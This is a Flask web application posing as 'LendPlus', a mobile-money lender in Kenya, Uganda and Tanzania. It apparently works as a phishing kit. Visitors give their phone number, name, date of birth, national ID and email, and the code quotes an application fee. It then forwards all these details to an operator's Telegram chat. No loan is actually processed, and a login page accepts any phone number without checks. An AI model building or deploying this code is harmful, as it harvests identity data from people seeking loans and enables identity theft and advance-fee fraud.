# app.py
from flask import Flask, render_template, request, session, redirect, url_for
import os
import logging
from datetime import datetime
import requests
import traceback

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)

# ==================== CUSTOM FILTERS ====================
@app.template_filter('format_number')
def format_number(value):
    """Format numbers with commas"""
    try:
        if value is None:
            return "0"
        return f"{int(value):,}"
    except (ValueError, TypeError):
        return str(value)

@app.template_filter('format_currency')
def format_currency(value):
    """Format currency with commas and 2 decimal places"""
    try:
        if value is None:
            return "0.00"
        return f"{float(value):,.2f}"
    except (ValueError, TypeError):
        return str(value)
# ==================== END CUSTOM FILTERS ====================

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)

COUNTRIES = {
    'kenya': {
        'name': 'Kenya',
        'currency': 'KES',
        'currency_symbol': 'KSh',
        'phone_prefix': '+254',
        'flag': '🇰🇪',
        'min_loan': 1000,
        'max_loan': 50000,
        'mobile_money': 'M-Pesa'
    },
    'uganda': {
        'name': 'Uganda',
        'currency': 'UGX',
        'currency_symbol': 'USh',
        'phone_prefix': '+256',
        'flag': '🇺🇬',
        'min_loan': 50000,
        'max_loan': 2000000,
        'mobile_money': 'M-Pesa'
    },
    'tanzania': {
        'name': 'Tanzania',
        'currency': 'TZS',
        'currency_symbol': 'TSh',
        'phone_prefix': '+255',
        'flag': '🇹🇿',
        'min_loan': 10000,
        'max_loan': 500000,
        'mobile_money': 'M-Pesa'
    }
}

APP_NAME = "LendPlus"
COMPANY_NAME = "Aventus Technology Limited"
SUPPORT_PHONE = "+254 709 029 000"
SUPPORT_EMAIL = "customer@lendplus.ke"
# ==================== END CONFIG ====================

def send_telegram_message(message):
    """Send message to Telegram"""
    if not TELEGRAM_ENABLED:
        return None
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        logger.error(f"Telegram error: {e}")
        return None

def format_application_message(data):
    """Format application for Telegram"""
    amount = data.get('loan_amount', 0)
    fee_rate = data.get('fee_rate', 5)
    fee_amount = amount * (fee_rate / 100)
    total = amount + fee_amount
    months = data.get('months', 1)
    country = data.get('country', 'Kenya')
    currency = data.get('currency', 'KES')
    phone_prefix = data.get('phone_prefix', '+254')
    
    return f"""
📋 <b>NEW LOAN APPLICATION</b>
━━━━━━━━━━━━━━━━━━━━━

🌍 <b>Application Details</b>
• Country: {data.get('flag', '')} {country}
• Currency: {currency}
• Mobile Money: {data.get('mobile_money', 'M-Pesa')}

👤 <b>Personal Information</b>
• Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
• Phone: {phone_prefix} {data.get('phone', 'N/A')}
• Email: {data.get('email', 'N/A')}
• ID Number: {data.get('national_id', 'N/A')}
• Gender: {data.get('gender', 'N/A')}

💰 <b>Loan Details</b>
• Amount: {currency} {amount:,.2f}
• Application Fee: {fee_rate}% ({currency} {fee_amount:,.2f})
• Total Payable: {currency} {total:,.2f}
• Term: {months} month(s)

🕐 <b>Application Time</b>
• Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Application ID: {data.get('application_id', 'N/A')}

━━━━━━━━━━━━━━━━━━━━━
<b>Status: ⏳ Pending Review</b>

📱 Support: {SUPPORT_PHONE}
"""

def calculate_loan_details(amount, country):
    """Calculate loan fee and repayment"""
    if country == 'kenya':
        if amount <= 10000:
            fee_rate, months = 5, 1
        elif amount <= 30000:
            fee_rate, months = 8, 3
        else:
            fee_rate, months = 12, 6
    elif country == 'uganda':
        if amount <= 500000:
            fee_rate, months = 5, 1
        elif amount <= 1000000:
            fee_rate, months = 8, 3
        else:
            fee_rate, months = 12, 6
    else:  # tanzania
        if amount <= 100000:
            fee_rate, months = 5, 1
        elif amount <= 300000:
            fee_rate, months = 8, 3
        else:
            fee_rate, months = 12, 6
    
    fee_amount = amount * (fee_rate / 100)
    total = amount + fee_amount
    
    return {
        'fee_rate': fee_rate,
        'fee_amount': fee_amount,
        'total': total,
        'months': months
    }

def generate_application_id():
    """Generate unique application ID"""
    return f"LN{datetime.now().strftime('%Y%m%d%H%M%S')}"

# ==================== ROUTES ====================

@app.route('/')
def index():
    """Homepage"""
    return render_template('index.html', 
                         app_name=APP_NAME,
                         support_phone=SUPPORT_PHONE,
                         company_name=COMPANY_NAME,
                         support_email=SUPPORT_EMAIL,
                         countries=COUNTRIES)

@app.route('/apply', methods=['GET', 'POST'])
def apply():
    """Step 1: Phone number entry"""
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        country = request.form.get('country', 'kenya')
        
        # Remove non-numeric characters
        phone = ''.join(filter(str.isdigit, phone))
        
        if phone and len(phone) >= 7:
            session['phone'] = phone
            session['country'] = country
            session['verified'] = True
            logger.info(f"📱 Phone: {phone}, Country: {country}")
            return redirect(url_for('personal_info'))
        else:
            error = "Please enter a valid phone number (at least 7 digits)"
            return render_template('apply.html', error=error, countries=COUNTRIES)
    
    return render_template('apply.html', countries=COUNTRIES)

@app.route('/personal-info', methods=['GET', 'POST'])
def personal_info():
    """Step 2: Personal information"""
    if 'phone' not in session:
        return redirect(url_for('apply'))
    
    country = session.get('country', 'kenya')
    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
    
    if request.method == 'POST':
        required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
        for field in required:
            if not request.form.get(field, '').strip():
                error = "Please fill in all required fields"
                return render_template('personal_info.html', error=error, country_data=country_data)
        
        session['first_name'] = request.form.get('first_name').strip()
        session['last_name'] = request.form.get('last_name').strip()
        session['middle_name'] = request.form.get('middle_name', '').strip()
        session['dob'] = request.form.get('dob')
        session['national_id'] = request.form.get('national_id').strip()
        session['email'] = request.form.get('email').strip()
        session['gender'] = request.form.get('gender')
        session['alt_phone'] = request.form.get('alt_phone', '').strip()
        
        return redirect(url_for('loan_amount'))
    
    return render_template('personal_info.html', country_data=country_data)

@app.route('/loan-amount', methods=['GET', 'POST'])
def loan_amount():
    """Step 3: Loan amount selection"""
    if 'phone' not in session:
        return redirect(url_for('apply'))
    
    country = session.get('country', 'kenya')
    country_data = COUNTRIES.get(country, COUNTRIES['kenya'])
    currency = country_data['currency']
    currency_symbol = country_data['currency_symbol']
    min_loan = country_data['min_loan']
    max_loan = country_data['max_loan']
    
    if request.method == 'POST':
        try:
            amount = float(request.form.get('loan_amount', 0))
            
            if amount < min_loan or amount > max_loan:
                error = f"Loan amount must be between {currency_symbol} {min_loan:,.0f} and {currency_symbol} {max_loan:,.0f}"
                return render_template('loan_amount.html', error=error, 
                                     country_data=country_data, 
                                     min_loan=min_loan, 
                                     max_loan=max_loan,
                                     currency=currency,
                                     currency_symbol=currency_symbol)
            
            details = calculate_loan_details(amount, country)
            application_id = generate_application_id()
            
            application_data = {
                'first_name': session.get('first_name', ''),
                'last_name': session.get('last_name', ''),
                'phone': session.get('phone', ''),
                'phone_prefix': country_data['phone_prefix'],
                'email': session.get('email', ''),
                'national_id': session.get('national_id', ''),
                'gender': session.get('gender', ''),
                'dob': session.get('dob', ''),
                'country': country_data['name'],
                'flag': country_data['flag'],
                'currency': currency,
                'currency_symbol': currency_symbol,
                'mobile_money': country_data['mobile_money'],
                'loan_amount': amount,
                'fee_rate': details['fee_rate'],
                'fee_amount': details['fee_amount'],
                'total': details['total'],
                'months': details['months'],
                'application_id': application_id
            }
            
            logger.info("=" * 50)
            logger.info(f"📋 APPLICATION RECEIVED - {country_data['flag']} {country_data['name']}")
            logger.info(f"Name: {application_data['first_name']} {application_data['last_name']}")
            logger.info(f"Phone: {country_data['phone_prefix']} {application_data['phone']}")
            logger.info(f"Amount: {currency} {application_data['loan_amount']}")
            logger.info(f"Application ID: {application_id}")
            logger.info("=" * 50)
            
            # Send to Telegram
            if TELEGRAM_ENABLED:
                try:
                    message = format_application_message(application_data)
                    send_telegram_message(message)
                    send_telegram_message(
                        f"🔔 {country_data['flag']} New application from {application_data['first_name']} "
                        f"{application_data['last_name']} for {currency} {amount:,.2f}"
                    )
                    logger.info("✅ Application sent to Telegram")
                except Exception as e:
                    logger.error(f"Telegram error: {e}")
            
            session['application_data'] = application_data
            return redirect(url_for('confirmation'))
            
        except Exception as e:
            logger.error(f"Error: {e}")
            logger.error(traceback.format_exc())
            error = "An error occurred. Please try again."
            return render_template('loan_amount.html', error=error, 
                                 country_data=country_data,
                                 min_loan=min_loan,
                                 max_loan=max_loan,
                                 currency=currency,
                                 currency_symbol=currency_symbol)
    
    return render_template('loan_amount.html', 
                         country_data=country_data,
                         min_loan=min_loan,
                         max_loan=max_loan,
                         currency=currency,
                         currency_symbol=currency_symbol)

@app.route('/confirmation')
def confirmation():
    """Step 4: Application confirmation"""
    if 'phone' not in session:
        return redirect(url_for('apply'))
    
    data = session.get('application_data', {})
    if not data:
        return redirect(url_for('loan_amount'))
    
    return render_template('confirmation.html',
                         first_name=data.get('first_name', ''),
                         last_name=data.get('last_name', ''),
                         phone=data.get('phone', ''),
                         phone_prefix=data.get('phone_prefix', '+254'),
                         amount=data.get('loan_amount', 0),
                         fee_rate=data.get('fee_rate', 5),
                         fee_amount=data.get('fee_amount', 0),
                         total=data.get('total', 0),
                         months=data.get('months', 0),
                         application_id=data.get('application_id', ''),
                         support_phone=SUPPORT_PHONE,
                         country=data.get('country', 'Kenya'),
                         flag=data.get('flag', '🇰🇪'),
                         currency=data.get('currency', 'KES'),
                         currency_symbol=data.get('currency_symbol', 'KSh'),
                         mobile_money=data.get('mobile_money', 'M-Pesa'))

@app.route('/dashboard')
def dashboard():
    """User dashboard"""
    return render_template('dashboard.html', phone=session.get('user_phone', ''))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page"""
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        if phone:
            session['logged_in'] = True
            session['user_phone'] = phone
            return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Logout user"""
    session.clear()
    return redirect(url_for('index'))

@app.route('/how-to-borrow')
def how_to_borrow():
    return render_template('how_to_borrow.html')

@app.route('/reviews')
def reviews():
    return render_template('reviews.html')

@app.route('/privacy')
def privacy():
    return render_template('privacy.html')

@app.route('/terms')
def terms():
    return render_template('terms.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)